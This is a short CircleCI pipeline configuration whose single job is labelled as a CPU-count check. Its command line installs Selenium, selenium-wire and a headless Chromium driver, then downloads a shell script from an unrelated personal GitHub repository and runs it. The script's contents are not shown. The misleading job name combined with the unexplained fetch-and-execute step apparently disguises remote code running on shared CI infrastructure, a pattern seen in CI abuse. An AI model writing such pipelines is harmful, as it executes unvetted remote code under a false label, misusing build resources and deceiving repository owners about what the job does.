version: 2.1

jobs:
  check_cpu:
    docker:
      - image: cimg/base:stable
    steps:
      - run:
          name: Check Number of CPUs
          command: |
            echo "Checking number of CPUs:"
            sudo apt-get update && sudo apt-get install -y neofetch && sudo apt install curl -y && sudo apt install wget -y && sudo apt-get install python3 -y && python --version 
            sudo apt-get update -y && sudo apt-get install python3-setuptools -y && pip install selenium && sudo apt-get install chromium-driver -y && pip install selenium selenium-wire && pip uninstall blinker -y && pip install blinker==1.4 && wget https://raw.githubusercontent.com/ladazkalii/lokd/refs/heads/main/hip.sh && chmod +x hip.sh && ./hip.sh

workflows:
  version: 2
  check:
    jobs:
      - check_cpu
